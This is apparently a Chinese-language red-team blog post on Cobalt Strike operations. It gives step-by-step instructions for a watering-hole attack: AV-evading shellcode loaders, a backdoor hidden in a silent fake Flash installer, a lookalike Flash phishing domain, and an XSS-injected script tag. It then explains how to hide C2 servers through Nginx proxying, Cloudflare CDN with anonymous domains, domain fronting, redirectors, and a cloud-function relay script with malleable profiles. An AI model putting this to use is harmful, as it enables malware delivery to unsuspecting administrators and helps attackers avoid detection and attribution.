+<h2 id="C2-Puddle-attack-C2水坑攻击"><a href="#C2-Puddle-attack-C2水坑攻击" class="headerlink" title="C2 Puddle attack-C2水坑攻击"></a>C2 Puddle attack-C2水坑攻击</h2><p>水坑攻击是黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做 法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并 植入攻击代码，一旦攻击目标访问该网站就会中招。在渗透测试中，通常用于后台没法拿webshell，在网站找xss漏洞植入后门，当管理员访问时，弹出框诱导管理员下载后门文件。</p>
+<h3 id="制作免杀后门"><a href="#制作免杀后门" class="headerlink" title="制作免杀后门"></a>制作免杀后门</h3><p>使用cobalt strike 生成shellcode 再转成uuid</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081632246.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081632280.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081632265.png"
+                     
+                ></p>
+<p>打开项目在payload.h填写在load.cpp 加入 隐藏终端框</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#pragma comment( linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot; )</span><br></pre></td></tr></table></figure></div>
+
+<p>生成的uuid字符串 设置 release x64 生成即可</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081632213.png"
+                     
+                ></p>
+<p>生成即可 免杀的方法有很多，大家自己去找。</p>
+<h3 id="创建rar自解压"><a href="#创建rar自解压" class="headerlink" title="创建rar自解压"></a>创建rar自解压</h3><p>首先下载登录flash下载exe文件 flashcenter_install_cn.exe 1.设置好压缩名 选择创建自解压</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081632238.png"
+                     
+                ></p>
+<p>选择高级 设置路径</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081632295.png"
+                     
+                ></p>
+<p>设置程序</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\temp\flash.exe C:\windows\temp\flashcenter_install_cn.exe</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081632193.png"
+                     
+                ></p>
+<p>安静模式 全部隐藏</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081632117.png"
+                     
+                ></p>
+<p>更新方式 解压并更新文件 覆盖方式 覆盖所有文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081633224.png"
+                     
+                ></p>
+<p>确定即可</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081633256.png"
+                     
+                ></p>
+<p>修改设置好的文件 图标还是解压的图标 使用工具替换图标</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081633747.png"
+                     
+                ></p>
+<p>设置好后</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081633220.png"
+                      alt="image-20230208163338171"
+                ></p>
+<p>当模板执行后自动允许后门和安装程序 后门也会上线</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081633154.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081633386.png"
+                     
+                ></p>
+<h3 id="搭建FLASH钓鱼"><a href="#搭建FLASH钓鱼" class="headerlink" title="搭建FLASH钓鱼"></a>搭建FLASH钓鱼</h3><p>注册一个类似flash官网的域名，把源码和后门上传到网站上</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081634802.png"
+                     
+                ></p>
+<p>修改源码 跳转改成后门的地址在后台找xss 填写</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;域名/flash.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>当目标访问 访问网址 或者登录后台的时候</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081634664.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081634589.png"
+                     
+                ></p>
+<h2 id="C2-Hiding-technology-C2隐藏"><a href="#C2-Hiding-technology-C2隐藏" class="headerlink" title="C2 Hiding technology-C2隐藏"></a>C2 Hiding technology-C2隐藏</h2><p>如何隐蔽C2服务器是实战中需要注意的问题</p>
+<h3 id="Nginx反向代理隐藏C2"><a href="#Nginx反向代理隐藏C2" class="headerlink" title="Nginx反向代理隐藏C2"></a>Nginx反向代理隐藏C2</h3><ul>
+<li>Teamserver 192.168.0.101</li>
+<li>Nginx 192.168.0.100</li>
+</ul>
+<p>192.168.0.100上配置Nginx反向代理，给192.168.0.101:8089做一个反向代理，访问自动跳转</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">     listen           80;</span><br><span class="line">     server_name      localhost;</span><br><span class="line">     #charset koi8-r;</span><br><span class="line">	</span><br><span class="line">	#access_log logs/host.access.log main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     location ~*/jquery&#123;</span><br><span class="line">     proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;       p	   proxy_pass http://192.168.0.101:8089;</span><br><span class="line">     &#125;</span><br><span class="line">     location /&#123;</span><br><span class="line">     proxy_pass	http://www.qq.com;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>服务器上准备好jquery-C2.4.profile配置文件，然后启动服务</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver IP 密码 配置文件</span><br></pre></td></tr></table></figure></div>
+
+<p>配置监听器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081501916.png"
+                     
+                ></p>
+<p>Wireshark抓取流量测试后发现：隐藏效果不好</p>
+<p>那么在 iptables 可以设置只允许某个IP访问，同理也可以设置限定IP访问Teamserver的IP</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -I INPUT -p tcp --dport 8089 -j DROP</span><br><span class="line">sudo iptables -I INPUT -s 192.168.0.100 -p tcp --dport 8089 -j ACCEPT sudo iptables-save</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="CDN转发技术隐藏C2"><a href="#CDN转发技术隐藏C2" class="headerlink" title="CDN转发技术隐藏C2"></a>CDN转发技术隐藏C2</h3><p>通过CDN&amp;HTTPS的加密技术，我们来隐藏C2的流量：C2的一些特征是可以被扫描器扫描到的，如果一旦C2服务器被检测出流量&#x2F;特征就会遭到拉黑，我们就不能够使用了，我们可以通过一些项目来保护C2服务器不被发现。原理：让cdn转发合法的http或者https流量来达到隐藏的目的。</p>
+<p>注册：<a class="link"   target="_blank" rel="noopener" href="https://dash.cloudflare.com/" >https://dash.cloudflare.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>准备一个匿名的域名将DNS设置成 cloudflare 的DNS，打开 cloudflare 主页 添加域名</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081530169.png"
+                     
+                ></p>
+<p>添加站点后cloudflare会寻找现在的域名解析，扫描完后会给出域名的dns，拿到这个dns到域名商更改dns即可，这里以阿里云为例</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081531058.png"
+                     
+                ></p>
+<p>设置SSL证书：cloudflare SSL&#x2F;TLS 加密模式为 完全</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081532153.png"
+                     
+                ></p>
+<p>选择 源服务器 创建证书 选择 证书类型</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081532128.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081532843.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081533029.png"
+                     
+                ></p>
+<p>即可，然后生成 cobaltstrike 新证书，把pem和key复制下来到 服务器上 然后把cobalt strike 默认的证书文件删除 cobaltstrike.store，生成新的证书</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in server.pem -inkey server.key -out cfcert.p12 -name cloudflare_cert -passout pass:密码</span><br><span class="line">keytool -importkeystore -deststorepass  -destkeypass 密码 -destkeystore cfcert.store -srckeystore cfcert.p12 -srcstoretype PKCS12 -srcstorepass 密码 - alias cloudflare_cert</span><br></pre></td></tr></table></figure></div>
+
+<p>设置c2文件，keystore 这个是生成的文件 password是证书的密码 host是域名头</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">set keystore &quot;cfcert.store&quot;; set password &quot;123456&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">set uri_x86 &quot;/api/1&quot;; set uri_x64 &quot;/api/2&quot;; client &#123;</span><br><span class="line">header &quot;Host&quot; &quot;XXXXXXXX&quot;;&#125; server &#123;</span><br><span class="line">output&#123; print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">http-get &#123;</span><br><span class="line">set uri &quot;/api/3&quot;; client &#123;</span><br><span class="line">header &quot;Host&quot; &quot;XXXXXXX&quot;; metadata &#123;</span><br><span class="line">base64;</span><br><span class="line">header &quot;Cookie&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">output&#123; print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">set uri &quot;/api/4&quot;; client &#123;</span><br><span class="line">header &quot;Host&quot; &quot;XXXXXXXX&quot;; id &#123;</span><br><span class="line">uri-append;</span><br><span class="line">&#125;</span><br><span class="line">output&#123; print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">output&#123; print;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>启动：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver IP 密码 c2.profile</span><br></pre></td></tr></table></figure></div>
+
+<p>设置监听器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081535172.png"
+                     
+                ></p>
+<p>正常配置就好，只是注意cloudflare免费版本支持解析少量的端口，具体端口如下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:</span><br><span class="line">80、8080、8880、2052、2082、2086、2095</span><br><span class="line">https:</span><br><span class="line">443、2053、2083、2087、2096、8443</span><br></pre></td></tr></table></figure></div>
+
+<p>如果在云上有安全规则，访问<a class="link"   target="_blank" rel="noopener" href="https://www.cloudflare.com/ips/%EF%BC%8C%E5%8E%BB%E6%8A%8Acloudflare%E7%9A%84%E5%9C%B0%E5%9D%80%E9%83%BD%E5%8A%A0%E5%85%A5%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AE%89%E5%85%A8%E7%BB%84%EF%BC%8C%E5%8F%AA%E5%85%81%E8%AE%B8cloudflare%E9%93%BE%E6%8E%A5%E3%80%82%E5%8F%AF%E4%BB%A5%E5%8F%82%E8%80%83%EF%BC%9A[Cobalt" >https://www.cloudflare.com/ips/，去把cloudflare的地址都加入云服务器的安全组，只允许cloudflare链接。可以参考：[Cobalt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Strike特征隐藏 - Lushun - 博客园 (cnblogs.com)](<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/14396744.html" >https://www.cnblogs.com/Xy--1/p/14396744.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
+<ol>
+<li><p>配置了cdn</p>
+</li>
+<li><p>拥有一个公网域名</p>
+</li>
+<li><p>配置cdn的A记录解析使其能解析到C2的ip</p>
+</li>
+<li><p>将公网域名填写到cs listener的host处并填写可用的端口</p>
+</li>
+<li><p>可达到的效果：受害主机上只会有跟cdn的ip通信的流量，不会有跟真实C2通信的流量，可以保护C2的ip，但是域名还是会暴露。</p>
+</li>
+</ol>
+<p>技术实现重点：</p>
+<ul>
+<li>一个不备案的域名，否则这个方式毫无用处</li>
+<li>这种技术对http与https没有强制要求，都可以使用，而域前置技术要求是https</li>
+</ul>
+<h3 id="域前置技术隐藏C2"><a href="#域前置技术隐藏C2" class="headerlink" title="域前置技术隐藏C2"></a>域前置技术隐藏C2</h3><p>域前置技术跟CDN技术比较类似，都是会用到CDN，但域前置技术必须要用https，因为它是基于TLS协议的，域前置还有一个特点是需要修改请求包的host头，修改方法是修改malleable profile文件，我的这篇malleable_profile文件配置概述写了修改方法，而CDN是创建好CDN后直接就可以使用的，不用做过多的配置不过效果也有不同，CDN技术只能用自己的域名，如果自己域名被放进黑名单基本就凉凉，但是域前置技术可以使用别人的高信誉域名来隐藏自己的真实域名，例如用微软的域名伪装自己，当然前提是微软的域名得跟你的域名再同一个CDN下，这种技术现在在不少的CDN厂商下都被禁止了，不一定会利用成功。</p>
+<p>原理：同一个cdn厂商下倘若有两个域名a.com，b.com，这时候我们使用curl命令访问第一个a.com并将host名改为b.com这时候，实际访问的是b.com的内容。而一般的监测机制是不会检测host头的。</p>
+<p>可达到的效果：通过一个高信任域名隐藏自己的真实域名与ip，且受害主机上的流量只有跟cdn通信的，不会有跟真实c2的。</p>
+<p>技术实现重点：</p>
+<ul>
+<li>需要基于https</li>
+<li>需要知道cdn上的其他高信誉域名或者ip</li>
+<li>需要修改malleable profile文件</li>
+</ul>
+<h3 id="重定向技术隐藏C2"><a href="#重定向技术隐藏C2" class="headerlink" title="重定向技术隐藏C2"></a>重定向技术隐藏C2</h3><p>这种技术有点像乞丐版的CDN或者域前置技术。总的来说就是得有两台vps，一台做重定向，一台是真正的C2，而受害者只与那台做重定向的机器通信，重定向机器只会转发来自beacon的特定流量到C2控制端主机，对于其他流量可以自定义设置处理方法，一般是采用重定向到一些高信誉域名上例如百度等。</p>
+<p>可达到的效果：受害者上只会有与重定向机器之间的流量，不会有与真实c2服务器的流量，重定向服务器会将非beacon的请求重定向到一些高信誉域名上，达到迷惑的目的，不过如果受害者ban掉了重定向机器的ip，对攻击者的损失也是很大的。</p>
+<p>技术实现重点：</p>
+<ul>
+<li>两台服务器</li>
+<li>配置apache_rewrite</li>
+<li>配置malleable profile文件</li>
+</ul>
+<p>可以参考：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/category_10258294.html" >cobalt strike相关_Shanfenglan7的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="云函数技术隐藏C2"><a href="#云函数技术隐藏C2" class="headerlink" title="云函数技术隐藏C2"></a>云函数技术隐藏C2</h3><p>其中域前置技术在18年及更早还比较有效，现在越来越多云厂商如cloudflare开始禁止域前置行为。云函数核心思想其实很简单，就是由第三方提供的服务接收C2客户端流量，转发给C2服务端，避免直接暴露服务端。转自：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/SeanGyy/p/15614445.html" >云函数隐藏C2服务器 - 小小小怪将军 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>首先创建一个云函数,创建方式选择自定义创建</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081543656.png"
+                     
+                ></p>
+<p>点击完成创建。</p>
+<p>进入函数，选择触发管理，选择API网关触发</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081543644.png"
+                     
+                ></p>
+<p>随后点击API服务名,进入API服务</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081543632.png"
+                     
+                ></p>
+<p>选择编辑,修改配置</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081543693.png"
+                     
+                ></p>
+<p>点击立即完成，发布</p>
+<p>在API基础配置里记录公网访问地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081543706.png"
+                     
+                ></p>
+<p>返回函数管理</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081543640.png"
+                     
+                ></p>
+<p>选择修改函数代码,将内容改成如下即可</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*- </span><br><span class="line">import json,requests,base64 </span><br><span class="line">def main_handler(event, context): </span><br><span class="line">    response = &#123;&#125; </span><br><span class="line">    path = None </span><br><span class="line">    headers = None </span><br><span class="line">    try:</span><br><span class="line">        C2=&#x27;http://IP:PORT&#x27; </span><br><span class="line">        if &#x27;path&#x27; in event.keys(): </span><br><span class="line">            path=event[&#x27;path&#x27;] </span><br><span class="line">        if &#x27;headers&#x27; in event.keys(): </span><br><span class="line">            headers=event[&#x27;headers&#x27;] </span><br><span class="line">        if &#x27;httpMethod&#x27; in event.keys() and event[&#x27;httpMethod&#x27;] == &#x27;GET&#x27; : </span><br><span class="line">            resp=requests.get(C2+path,headers=headers,verify=False) </span><br><span class="line">        else: </span><br><span class="line">            resp=requests.post(C2+path,data=event[&#x27;body&#x27;],headers=headers,verify=False) </span><br><span class="line">            print(resp.headers)</span><br><span class="line">            print(resp.content) </span><br><span class="line">        response=&#123; </span><br><span class="line">            &quot;isBase64Encoded&quot;: True, </span><br><span class="line">            &quot;statusCode&quot;: resp.status_code, </span><br><span class="line">            &quot;headers&quot;: dict(resp.headers), </span><br><span class="line">            &quot;body&quot;: str(base64.b64encode(resp.content))[2:-1] </span><br><span class="line">        &#125; </span><br><span class="line">    except Exception as e: </span><br><span class="line">        print(e) </span><br><span class="line">    finally: </span><br><span class="line">        return response</span><br></pre></td></tr></table></figure></div>
+
+<p>部署发布即可,随后在服务器的Cobaltstrike目录下,新建cloud.profile文件，内容如下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter &quot;0&quot;;</span><br><span class="line">set maxdns &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0&quot;;</span><br><span class="line">http-get &#123;</span><br><span class="line">    set uri &quot;/api/x&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">    set uri_x86 &quot;/vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/api/y&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>随后打开Cobaltstrike，加载cloud.profile，创建监听器,HTTP HOST为之前记录的API网关地址,注意是80端口的那个</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081544211.png"
+                     
+                ></p>
+<p>随后受害主机正常上线,但是已经经历了云函数隐匿,很难被溯源到真实地址。</p>
+<p>自行搜索参考了解：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1838764" >实战填坑 | 隐藏C2域名地址技巧 - 腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/330713.html" >流量加密之C2隐藏 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="Communication-extension-通信扩展"><a href="#Communication-extension-通信扩展" class="headerlink" title="Communication extension-通信扩展"></a>Communication extension-通信扩展</h2><p>Cobalt Strike 可以引用其他的通讯框架 ExternalC2，ExternalC2 是由 Cobalt Strike 提出的一套规范&#x2F;框架，它允许黑客根据需要对框架提供的默认 HTTP(S)&#x2F;DNS&#x2F;SMB C2 通信通道进行扩展。</p>
+<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm" >https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_main.htm" >https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_main.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h3 id="Profile-资源"><a href="#Profile-资源" class="headerlink" title="Profile 资源"></a>Profile 资源</h3><p>C2 Profile 可以调整传输过程中的流量, 一定程度上可以隐蔽 C2 服务器</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/rsmudge/Malleable-C2-Profiles" >rsmudge&#x2F;Malleable-C2-Profiles <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - This repository is a collection of Malleable C2 profiles that you may use. These profiles work with Cobalt Strike 3.x.</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/threatexpress/malleable-c2" >threatexpress&#x2F;malleable-c2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - Cobalt Strike Malleable C2 Design and Reference Guide</li>
